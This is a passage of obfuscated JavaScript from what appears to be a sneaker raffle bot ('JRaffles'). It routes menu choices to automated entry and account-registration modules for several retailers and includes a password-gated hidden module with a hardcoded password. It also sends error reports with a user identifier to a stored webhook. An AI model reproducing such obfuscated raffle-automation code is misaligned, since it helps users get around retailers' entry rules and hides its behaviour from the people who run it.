                    var _0xdc20f3 = _0x306e17[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x6c9826 = await _0x24911e(), _0x10cc68 = await _0x6dcdec();
                    return _0x15bf3f['shuffleTasks'] && await _0x123107(_0x10cc68), await _0xdc20f3['function'](_0xdc20f3, _0x10cc68, _0x6c9826), _0x479139();
                } else {
                    if (_0x306e17[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x17591d(_0x306e17[taskModule]['modules']);
                        var _0xdc20f3 = _0x306e17[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x6c9826 = await _0x24911e(), _0x872db4 = await _0x6dcdec();
                            return _0x15bf3f['shuffleTasks'] && await _0x123107(_0x872db4), await _0xdc20f3['function'](_0xdc20f3, _0x872db4, _0x6c9826), _0x479139();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x6c9826 = await _0x24911e();
                                return await _0xdc20f3['function'](_0xdc20f3, null, _0x6c9826), _0x479139();
                            }
                        }
                        ;
                    } else {
                        if (_0x306e17[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x17591d(_0x306e17[taskModule]['modules']);
                            var _0xdc20f3 = _0x306e17[taskModule]['modules'][taskFunction], _0x6c9826 = await _0x24911e(), _0x1221fa = await _0x6dcdec();
                            return _0x15bf3f['shuffleTasks'] && await _0x123107(_0x1221fa), await _0xdc20f3['function'](_0xdc20f3, _0x1221fa, _0x6c9826), await _0x37731a(0x1388), _0x479139();
                        } else {
                            if (_0x306e17[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x17591d(_0x306e17[taskModule]['modules']);
                                var _0xdc20f3 = _0x306e17[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x6c9826 = await _0x24911e(), _0x872db4 = await _0x6dcdec();
                                    return _0x15bf3f['shuffleTasks'] && await _0x123107(_0x872db4), await _0xdc20f3['function'](_0xdc20f3, _0x872db4, _0x6c9826), _0x479139();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x6c9826 = await _0x24911e();
                                        return await _0xdc20f3['function'](_0xdc20f3, null, _0x6c9826), _0x479139();
                                    }
                                }
                                ;
                            } else {
                                if (_0x306e17[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x17591d(_0x306e17[taskModule]['modules']);
                                    var _0xdc20f3 = _0x306e17[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x2c813c('https://bouncewear.com/nl/account/register', _0xdc20f3);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x306e17[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x17591d(_0x306e17[taskModule]['modules']);
                                        var _0xdc20f3 = _0x306e17[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x6c9826 = await _0x24911e(), _0x49816a = await _0x6dcdec();
                                            return _0x15bf3f['shuffleTasks'] && await _0x123107(_0x49816a), await _0xdc20f3['function'](_0xdc20f3, _0x49816a, _0x6c9826), _0x479139();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x6c9826 = await _0x24911e(), _0x49816a = await _0x6dcdec();
                                                return _0x15bf3f['shuffleTasks'] && await _0x123107(_0x49816a), await _0xdc20f3['function'](_0xdc20f3, _0x49816a, _0x6c9826), _0x479139();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x306e17[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x17591d(_0x306e17[taskModule]['modules']);
                                            var _0xdc20f3 = _0x306e17[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x6c9826 = await _0x24911e(), _0x235798 = await _0x6dcdec();
                                                return _0x15bf3f['shuffleTasks'] && await _0x123107(_0x235798), await _0xdc20f3['function'](_0xdc20f3, _0x235798, _0x6c9826), _0x479139();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x6c9826 = await _0x24911e(), _0x235798 = await _0x6dcdec();
                                                    return _0x15bf3f['shuffleTasks'] && await _0x123107(_0x235798), await _0xdc20f3['function'](_0xdc20f3, _0x235798, _0x6c9826), _0x479139();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x306e17[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x17591d(_0x306e17[taskModule]['modules']);
                                                var _0xdc20f3 = _0x306e17[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x6c9826 = await _0x24911e(), _0x23a7ee = await _0x6dcdec();
                                                    return _0x15bf3f['shuffleTasks'] && await _0x123107(_0x23a7ee), await _0xdc20f3['function'](_0xdc20f3, _0x23a7ee, _0x6c9826), _0x479139();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x6c9826 = await _0x24911e(), _0x23a7ee = await _0x6dcdec();
                                                        return _0x15bf3f['shuffleTasks'] && await _0x123107(_0x23a7ee), await _0xdc20f3['function'](_0xdc20f3, _0x23a7ee, _0x6c9826), _0x479139();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x306e17[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x17591d(_0x306e17[taskModule]['modules']);
                                                    var _0xdc20f3 = _0x306e17[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x6c9826 = await _0x24911e(), _0x2f0439 = await _0x6dcdec();
                                                        return _0x15bf3f['shuffleTasks'] && await _0x123107(_0x2f0439), await _0xdc20f3['function'](_0xdc20f3, _0x2f0439, _0x6c9826), _0x479139();
                                                    }
                                                } else {
                                                    if (_0x306e17[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x37731a(0x3e8), _0x479139();
                                                    else {
                                                        if (_0x306e17[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x2692f2 = _0x306e17[taskModule]['name'], _0x6c9826 = await _0x24911e();
                                                            return await _0x114254(_0x2692f2, _0x6c9826), _0x479139();
                                                        } else {
                                                            if (_0x306e17[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x17591d(_0x306e17[taskModule]['modules']);
                                                                var _0xdc20f3 = _0x306e17[taskModule]['modules'][taskFunction];
                                                                return await _0xdc20f3['function'](_0xdc20f3), _0x479139();
                                                            } else {
                                                                if (_0x306e17[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x45b9d5 = 0x0;
                                                                    for (const _0x96bba1 in _0x15bf3f) {
                                                                        console['log']('(' + _0x45b9d5 + ')\x20' + _0x96bba1 + '\x20:\x20' + _0x15bf3f[_0x96bba1]), _0x45b9d5++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x45b9d5 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x2e3cb1 = await _0x2c85fa();
                                                                    if (_0x2e3cb1 == _0x45b9d5)
                                                                        return _0x479139();
                                                                    console['clear'];
                                                                    var _0x3c2384 = 0x0;
                                                                    for (var _0x3bca44 in _0x15bf3f) {
                                                                        if (_0x2e3cb1 == _0x3c2384) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x3bca44 + '\x20:'), _0x15bf3f[_0x3bca44] = await _0x1b05fa(), _0x241ca2['writeFileSync']('../settings.json', JSON['stringify'](_0x15bf3f));
                                                                            break;
                                                                        } else
                                                                            _0x3c2384++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x37731a(0xbb8), _0x479139();
                                                                } else {
                                                                    if (_0x306e17[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x2ce21f(), _0x479139();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x306e17[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x8e542f = await _0x5c93fb();
                                                                            _0x8e542f == 'ModuleVoorDeBoys' ? (await _0x43d730(), await _0x42f916(), await afewFunction(_0xd87547[_0x2724dc], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x37731a(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x479139();
            } catch (_0x570c0e) {
                return console['log'](_0x570c0e), _0x479139();
            }
        } catch (_0x4f179a) {
            return console['log'](_0x4f179a), await _0x37731a(0x3a98);
        }
}
;
_0x57fa03('JRaffles\x20' + _0x2bd99c), _0x2ce21f();
try {
    _0x2dbe27();
} catch (_0x32ec31) {
    var _0xd23d0a = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x6362be
            },
            {
                'name': 'Version',
                'value': '' + _0x2bd99c
            },
            {
                'name': 'Error',
                'value': '' + _0x32ec31
            }
        ]
    }];
    const _0x3d1dcf = { 'embeds': _0xd23d0a };
    _0x4160b0(_0x3ce78e, _0x3d1dcf);
}